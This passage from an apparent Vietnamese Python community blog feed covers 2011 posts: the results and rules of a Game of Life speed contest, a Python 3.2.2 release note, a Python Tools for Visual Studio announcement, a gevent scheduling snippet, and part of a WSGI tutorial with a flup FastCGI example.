G:\vithon\life&amp;gt;judge.py -c 2 -r 2 -n 1 life.MainBoard cuocthidoi.Board
Generating random test case
Width = 2
Height = 2

1 0
0 0

Executing life.MainBoard
Executing cuocthidoi.Board

Checking for cell (0, 0)
*** alive count = 1, dead_count = 1
life is eliminated

Checking for cell (1, 1)
*** alive count = 0, dead_count = 2

Checking for cell (1, 0)
*** alive count = 0, dead_count = 2

Checking for cell (1, 0)
*** alive count = 0, dead_count = 2

RESULT:
[-] life : 0.000000 seconds
[+] cuocthidoi : 0.000000 seconds
&lt;/pre&gt;
&lt;p&gt;Với lần chạy này, &lt;strong&gt;life&lt;/strong&gt; đã bị loại, và chỉ còn &lt;strong&gt;cuocthidoi&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Tóm lại, sau ba vòng chạy thì chỉ có mô-đun &lt;strong&gt;cuocthidoi&lt;/strong&gt; đưa ra đáp án đúng. Tuy nhiên, giải này không có người chiến thắng vì mục tiêu của giải là thi về tốc độ thực thi. Khi chỉ có một đối thủ trong cuộc thi thì giải trở nên vô nghĩa. Hơn nữa, bài tham dự &lt;strong&gt;cuocthidoi.py&lt;/strong&gt; đã không thực hiện đúng quy chế thứ 3 trong thể lệ tham gia nên cũng bị loại. Mặc dù không có người chiến thắng nhưng nhóm PCNV xin chúc mừng tác giả &lt;strong&gt;Vũ Khuê&lt;/strong&gt; đã vượt qua các đối thủ khác trong cuộc thi.&lt;/p&gt;
&lt;p&gt;Nói tóm lại, giải đã không đạt được mục tiêu đề ra ban đầu. Xin hẹn gặp các bạn ở các giải sau!&lt;/p&gt;
</content><category term="python"></category><category term="contest"></category></entry><entry><title>Cuộc thi Đời</title><link href="/2011/09/cuoc-thi-doi.html" rel="alternate"></link><published>2011-09-15T06:36:00+07:00</published><updated>2011-09-15T06:36:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2011-09-15:/2011/09/cuoc-thi-doi.html</id><summary type="html">&lt;p&gt;Nhóm PCNV hân hạnh tổ chức một cuộc thi nhỏ với giải thưởng lớn!&lt;/p&gt;
&lt;p&gt;Game of Life, tạm dịch Trò chơi Đời, là một mô phỏng trạng thái các điểm trên một ma trận MxN đơn giản. Các điểm trên ma trận có trạng thái hoặc là sống, hoặc là …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Nhóm PCNV hân hạnh tổ chức một cuộc thi nhỏ với giải thưởng lớn!&lt;/p&gt;
&lt;p&gt;Game of Life, tạm dịch Trò chơi Đời, là một mô phỏng trạng thái các điểm trên một ma trận MxN đơn giản. Các điểm trên ma trận có trạng thái hoặc là sống, hoặc là chết. Trạng thái của một ma trận được gọi là một thế hệ. Các điểm trên ma trận ở thế hệ &lt;strong&gt;G&lt;/strong&gt; sẽ tuân theo các luật sau để xác định trạng thái của chúng ở thế hệ &lt;strong&gt;G + 1&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Nếu số lượng các điểm sống chung quanh điểm hiện tại là 3, thì điểm hiện tại sẽ sống.&lt;/li&gt;
&lt;li&gt;Nếu số lượng các điểm sống chung quanh điểm hiện tại là 2, thì điểm hiện tại sẽ tiếp tục giữ trạng thái hiện tại.&lt;/li&gt;
&lt;li&gt;Nếu số lượng các điểm sống chung quanh điểm hiện tại nhỏ hơn 2, hoặc lớn hơn 3, điểm hiện tại sẽ chết.&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Cuộc thi Đời&lt;/strong&gt; là sự tranh đua của các mã nguồn Python thực hiện việc tối ưu hóa cách thể hiện mô phỏng trên. Thể lệ của cuộc thi bao gồm:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Bài tham dự gửi về địa chỉ thư admin tại vithon.org.&lt;/li&gt;
&lt;li&gt;Bài tham dự chỉ được sử dụng ngôn ngữ Python, và các thư viện chuẩn đi kèm.&lt;/li&gt;
&lt;li&gt;Bài tham dự chỉ cần hiện thực hóa lớp mẫu bên dưới bằng cách kế thừa nó và cài đặt các phương thức cần thiết.&lt;/li&gt;
&lt;li&gt;Yếu tố cơ bản để đánh giá là tốc độ chạy của chương trình.&lt;/li&gt;
&lt;li&gt;Hạn tham dự là hết ngày 15 tháng 10 năm 2011.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Chỉ có một&lt;/strong&gt; giải có trị giá &lt;strong&gt;tương đương 250 đô la Singapore&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Quyết định của ban tổ chức là cuối cùng, xin không nhận khiếu nại.&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Board&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Represents the Game of Life matrix.&lt;/span&gt;

&lt;span class="sd"&gt;  Each cell has at most 8 neighbors. A cell may have less than 8 neighbors.&lt;/span&gt;
&lt;span class="sd"&gt;  For example, a cell at (0, 0) would have only three neightbors (0, 1),&lt;/span&gt;
&lt;span class="sd"&gt;  (1, 0) and (1, 1).&lt;/span&gt;

&lt;span class="sd"&gt;  The cells are addressed in a row-major (row first) manner. The index starts&lt;/span&gt;
&lt;span class="sd"&gt;  from zero.&lt;/span&gt;

&lt;span class="sd"&gt;  &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Initializes this board.&lt;/span&gt;

&lt;span class="sd"&gt;      Args:&lt;/span&gt;
&lt;span class="sd"&gt;          width (int): Number of cells in a row.&lt;/span&gt;
&lt;span class="sd"&gt;          height (int): Number of rows in this board.&lt;/span&gt;

&lt;span class="sd"&gt;      &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

      &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="bp"&gt;NotImplemented&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generation&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Transform this board into next ``n`` generation(s).&lt;/span&gt;

&lt;span class="sd"&gt;      The transformation is in place similar to ``list.sort``.&lt;/span&gt;
&lt;span class="sd"&gt;      No value is returned to the caller.&lt;/span&gt;

&lt;span class="sd"&gt;      Args:&lt;/span&gt;
&lt;span class="sd"&gt;          n (int): Number of generations.&lt;/span&gt;

&lt;span class="sd"&gt;      Raises:&lt;/span&gt;
&lt;span class="sd"&gt;          ValueError: If n is smaller than 1.&lt;/span&gt;

&lt;span class="sd"&gt;      &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

      &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="bp"&gt;NotImplemented&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_cell&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;col&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Returns the state of the cell at row ``row`` and column ``col``.&lt;/span&gt;

&lt;span class="sd"&gt;      Args:&lt;/span&gt;
&lt;span class="sd"&gt;          row (int): The row, zero-indexed.&lt;/span&gt;
&lt;span class="sd"&gt;          col (int): The column, zero-indexed.&lt;/span&gt;

&lt;span class="sd"&gt;      Returns:&lt;/span&gt;
&lt;span class="sd"&gt;          True: If the cell is alive.&lt;/span&gt;
&lt;span class="sd"&gt;          False: If the cell is dead.&lt;/span&gt;

&lt;span class="sd"&gt;      &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

      &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="bp"&gt;NotImplemented&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;set_cell&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;col&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;state&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Sets a cell at row ``row`` and column ``col`` to state ``state``.&lt;/span&gt;

&lt;span class="sd"&gt;      Args:&lt;/span&gt;
&lt;span class="sd"&gt;          row (int): The row, zero-indexed.&lt;/span&gt;
&lt;span class="sd"&gt;          col (int): The column, zero-indexed.&lt;/span&gt;
&lt;span class="sd"&gt;          state (bool): Cell&amp;#39;s state.&lt;/span&gt;

&lt;span class="sd"&gt;      &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

      &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="bp"&gt;NotImplemented&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_row&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Returns the states of all cells in row ``row``.&lt;/span&gt;

&lt;span class="sd"&gt;      Args:&lt;/span&gt;
&lt;span class="sd"&gt;          row (int): The row, zero-indexed.&lt;/span&gt;

&lt;span class="sd"&gt;      Returns:&lt;/span&gt;
&lt;span class="sd"&gt;          A sequence of bools.&lt;/span&gt;

&lt;span class="sd"&gt;      &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

      &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="bp"&gt;NotImplemented&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mọi thắc mắc và thảo luận xin vui lòng gửi lên &lt;a class="reference external" href="forum.vithon.org"&gt;diễn đàn&lt;/a&gt;.&lt;/p&gt;
</content><category term="python"></category><category term="game"></category><category term="contest"></category></entry><entry><title>Python 3.2.2 ra đời</title><link href="/2011/09/python-322-ra-doi.html" rel="alternate"></link><published>2011-09-05T07:03:00+07:00</published><updated>2011-09-05T07:03:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2011-09-05:/2011/09/python-322-ra-doi.html</id><summary type="html">&lt;p&gt;Khoảng 10 tiếng trước, Georg Brandl đã gửi một bức thư điện tử lên hộp thư chung python-dev để công bố sự ra đời của phiên bản Python 3.2.2.&lt;/p&gt;
&lt;p&gt;Python 3.2.2 về cơ bản là phiên bản sửa lỗi, đặc biệt là lỗi &lt;a class="reference external" href="http://bugs.python.org/12576"&gt;trong mô-đun urllib …&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Khoảng 10 tiếng trước, Georg Brandl đã gửi một bức thư điện tử lên hộp thư chung python-dev để công bố sự ra đời của phiên bản Python 3.2.2.&lt;/p&gt;
&lt;p&gt;Python 3.2.2 về cơ bản là phiên bản sửa lỗi, đặc biệt là lỗi &lt;a class="reference external" href="http://bugs.python.org/12576"&gt;trong mô-đun urllib.request&lt;/a&gt; xảy ra trong 3.2.1.&lt;/p&gt;
&lt;p&gt;Phiên bản 3.2.2 có thể được tải về từ địa chỉ &lt;a class="reference external" href="http://www.python.org/download/releases/3.2.2/"&gt;http://www.python.org/download/releases/3.2.2/&lt;/a&gt;.&lt;/p&gt;
</content><category term="python"></category><category term="release"></category></entry><entry><title>Python Tools cho Visual Studio</title><link href="/2011/08/python-tools-cho-visual-studio.html" rel="alternate"></link><published>2011-08-31T09:37:00+07:00</published><updated>2011-08-31T09:37:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2011-08-31:/2011/08/python-tools-cho-visual-studio.html</id><summary type="html">&lt;p&gt;Ngày 29 tháng 08 vừa qua, Microsoft đã tung ra phiên bản đầu tiên của phần mềm miễn phí, nguồn mở &lt;a class="reference external" href="http://pytools.codeplex.com/"&gt;Python Tools&lt;/a&gt; dành cho Visual Studio.&lt;/p&gt;
&lt;p&gt;Với công cụ này, người dùng sẽ sử dụng giao diện quen thuộc của Visual Studio để viết mã theo ngôn ngữ Python …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ngày 29 tháng 08 vừa qua, Microsoft đã tung ra phiên bản đầu tiên của phần mềm miễn phí, nguồn mở &lt;a class="reference external" href="http://pytools.codeplex.com/"&gt;Python Tools&lt;/a&gt; dành cho Visual Studio.&lt;/p&gt;
&lt;p&gt;Với công cụ này, người dùng sẽ sử dụng giao diện quen thuộc của Visual Studio để viết mã theo ngôn ngữ Python. Một số tính năng chính bao gồm trình soạn thảo, quản lý dự án, trình gỡ rối, hỗ trợ Intellisense và Refactoring, hỗ trợ IronPython lẫn CPython. Ngoài ra, nếu sử dụng Visual Studio phiên bản Ultimate, người dùng sẽ có thêm cả trình Profiler.&lt;/p&gt;
&lt;p&gt;Công cụ Python Tools cho Visual Studio cần phiên bản &lt;a class="reference external" href="http://www.microsoft.com/downloads/en/details.aspx?familyid=8E5AA7B6-8436-43F0-B778-00C3BCA733D3&amp;amp;displaylang=en"&gt;Visual Studio Shell&lt;/a&gt; miễn phí, hoặc Visual Studio phiên bản Pro trở lên. Công cụ này không sử dụng chung với Visual Studio Express được.&lt;/p&gt;
</content><category term="ide"></category></entry><entry><title>Lập lịch gọi hàm với Gevent</title><link href="/2011/08/lap-lich-goi-ham-voi-gevent.html" rel="alternate"></link><published>2011-08-22T07:29:00+07:00</published><updated>2011-08-22T07:29:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2011-08-22:/2011/08/lap-lich-goi-ham-voi-gevent.html</id><summary type="html">&lt;p&gt;Đôi khi chúng ta cần một cách gì đó để lập lịch gọi hàm tương tự như công cụ &lt;tt class="docutils literal"&gt;cron&lt;/tt&gt; trong các hệ Unix. Nếu chúng ta may mắn đang làm việc với Gevent sẵn rồi thì hai dòng sau là một cách đơn giản để lập lịch.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;schedule …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Đôi khi chúng ta cần một cách gì đó để lập lịch gọi hàm tương tự như công cụ &lt;tt class="docutils literal"&gt;cron&lt;/tt&gt; trong các hệ Unix. Nếu chúng ta may mắn đang làm việc với Gevent sẵn rồi thì hai dòng sau là một cách đơn giản để lập lịch.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;schedule&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;delay&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kw_args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;gevent&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;spawn_later&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kw_args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;gevent&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;spawn_later&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;delay&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;schedule&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;delay&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kw_args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ý tưởng đằng sau hai dòng lệnh này là chúng ta tận dụng sẵn vòng lặp sự kiện (event loop) của Gevent để cài hàm cần được thực thi vào. Do đó, chúng ta sẽ đỡ được việc sử dụng vòng lặp với &lt;tt class="docutils literal"&gt;sleep&lt;/tt&gt;. Dòng thứ hai có tác dụng như một lệnh gọi đệ quy đuôi (tail recursion), nhưng không tốn bộ nhớ ngăn xếp (stack memory).&lt;/p&gt;
&lt;p&gt;Trong trường hợp chúng ta không sử dụng Gevent thì gói &lt;a class="reference external" href="http://packages.python.org/APScheduler/"&gt;apscheduler&lt;/a&gt; là một lựa chọn đáng tham khảo khác. Gói này cung cấp dịch vụ lập lịch tương tự như Quartz trong thế giới Java.&lt;/p&gt;
</content><category term="cron"></category><category term="gevent"></category><category term="schedule"></category></entry><entry><title>Lập trình web với Python (7)</title><link href="/2011/08/lap-trinh-web-voi-python-7.html" rel="alternate"></link><published>2011-08-11T08:00:00+07:00</published><updated>2011-08-11T08:00:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2011-08-11:/2011/08/lap-trinh-web-voi-python-7.html</id><summary type="html">&lt;p&gt;Trong bài cuối của loạt bài Lập trình web với Python, chúng ta sẽ bàn đến chuẩn &lt;strong&gt;WSGI&lt;/strong&gt; (Web Server Gateway Interface).&lt;/p&gt;
&lt;p&gt;WSGI, khác với HTTP, CGI và FCGI, không phải là chuẩn giao thức liên lạc (communication protocol) mà là chuẩn giao tiếp (standard interface) giữa ứng dụng máy …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trong bài cuối của loạt bài Lập trình web với Python, chúng ta sẽ bàn đến chuẩn &lt;strong&gt;WSGI&lt;/strong&gt; (Web Server Gateway Interface).&lt;/p&gt;
&lt;p&gt;WSGI, khác với HTTP, CGI và FCGI, không phải là chuẩn giao thức liên lạc (communication protocol) mà là chuẩn giao tiếp (standard interface) giữa ứng dụng máy chủ (server) và các khung xương (framework) hay các ứng dụng web (web application). Hình tượng hóa mà nói, WSGI nằm phía trên HTTP/CGI/FCGI và phía dưới ứng dụng thật sự. Lớp WSGI giúp lớp ứng dụng trao đổi với lớp máy chủ theo một cách khả chuyển, tức là một ứng dụng WSGI có thể chạy như nhau trên máy chủ khác nhau như Apache, NGINX, hay Lighttpd, sử dụng các giao thức khác nhau như CGI, FCGI, SCGI, hay AJP. Nói một cách khác, WSGI &amp;quot;che&amp;quot; cách liên lạc qua mạng và tạo điều kiện cho ứng dụng web tập trung vào việc xử lý các vấn đề quan trọng hơn.&lt;/p&gt;
&lt;p&gt;Một ứng dụng WSGI là một đối tượng gọi được (callable object). Một đối tượng gọi được có thể là một hàm, một phương thức, hoặc một đối tượng có hàm &lt;strong&gt;__call__&lt;/strong&gt;. Đối tượng gọi được này phải nhận hai tham số là &lt;strong&gt;environ&lt;/strong&gt; và &lt;strong&gt;start_response&lt;/strong&gt;. Tham số &lt;strong&gt;environ&lt;/strong&gt; là một từ điển với các khóa theo chuẩn CGI và một số khóa đặc biệt mà máy chủ WSGI có thể truyền cho ứng dụng. &lt;strong&gt;start_response&lt;/strong&gt; là một đối tượng gọi được do máy chủ WSGI cung cấp cho ứng dụng để ứng dụng bắt đầu việc truyền dữ liệu cho máy chủ WSGI. &lt;strong&gt;start_response&lt;/strong&gt; nhận hai tham số là dòng trạng thái trả lời (status string) và một danh sách bộ-2 (list of 2-tuple) các đầu mục (header), mỗi bộ-2 bao gồm tên và giá trị của đầu mục. Giá trị trả về của ứng dụng WSGI là một bộ khả lặp (iterable) sinh ra nội dung sẽ được máy chủ WSGI truyền lại cho máy chủ HTTP hoặc trình duyệt. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;simple_app&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Simplest possible application object&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
  &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;
  &lt;span class="n"&gt;response_headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
  &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response_headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Hello world!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Đầu tiên, ta thiết lập chuỗi trạng thái là &lt;strong&gt;200 OK&lt;/strong&gt;, xác định đầu mục &lt;strong&gt;Content-type&lt;/strong&gt; là &lt;strong&gt;text/plain&lt;/strong&gt; rồi gọi &lt;strong&gt;start_response&lt;/strong&gt; với các thông tin như vậy. Giá trị trả về là một danh sách với phần tử duy nhất là chuỗi &lt;strong&gt;Hello world!n&lt;/strong&gt;. Ta cũng có thể trả về chuỗi &lt;strong&gt;Hello world!&lt;/strong&gt; trực tiếp mà không cần đặt nó vào trong một danh sách vì bản thân một chuỗi cũng là một đối tượng khả lặp. Tuy nhiên, làm như vậy không được khuyến khích vì khi đó máy chủ WSGI sẽ phải làm việc nhiều hơn, lặp qua từng ký tự H, e, l, l, o... thay vì lấy thẳng chuỗi trả lời.&lt;/p&gt;
&lt;p&gt;Chúng ta sẽ viết lại ứng dụng đếm số lần truy cập như trong kỳ trước theo dạng một ứng dụng WSGI. Chúng ta sẽ tạo tập tin &lt;strong&gt;C:Program FilesApache Software FoundationApache2.2fcgi-binhello2.py&lt;/strong&gt; với nội dung như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!C:\Python26\python.exe&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flup.server&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;fcgi&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;HelloApp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

      &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
              &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

      &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__call__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
              &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
              &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
              &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Hello WSGI World &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;webapp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HelloApp&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
      &lt;span class="n"&gt;fcgi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WSGIServer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;webapp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bindAddress&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8888&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
